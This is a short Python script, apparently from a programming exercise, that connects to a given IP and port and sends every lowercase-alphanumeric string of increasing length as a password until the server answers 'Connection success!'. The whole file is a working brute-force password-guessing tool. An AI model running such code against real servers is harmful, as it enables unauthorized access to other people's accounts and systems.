import socket
import sys
import itertools


args = sys.argv
ip = str(args[1])
port = int(args[2])
buffer_size = 1024
char_set = 'abcdefghijklmnopqrstuvwxyz0123456789'
CONNECTION_SUCCESS = 'Connection success!'

my_socket = socket.socket()
address = (ip, port)
my_socket.connect(address)
for i in range(1, 1_000_000):
    options = itertools.product(char_set, repeat=i)
    for option in options:
        password = ''.join(option)
        my_socket.send(password.encode())
        response = my_socket.recv(buffer_size)
        if response.decode() == CONNECTION_SUCCESS:
            print(password)
            quit()

my_socket.close()
